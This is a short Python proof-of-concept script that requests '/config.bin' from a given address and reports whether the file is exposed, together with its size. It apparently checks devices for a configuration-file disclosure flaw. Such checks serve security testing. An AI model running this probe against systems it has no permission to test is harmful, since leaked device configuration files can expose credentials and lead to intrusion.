#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'

import requests

def poc(address):
    url = 'http://{}/config.bin'.format(address)
    try:
        resp = requests.get(url, stream=True)
        if resp.headers.get('Content-Length'):
            return address + ' ' + resp.headers.get('Content-Length')
        elif resp:
            return address
    except requests.RequestException as e:
        return False
    except Exception as e:
        return False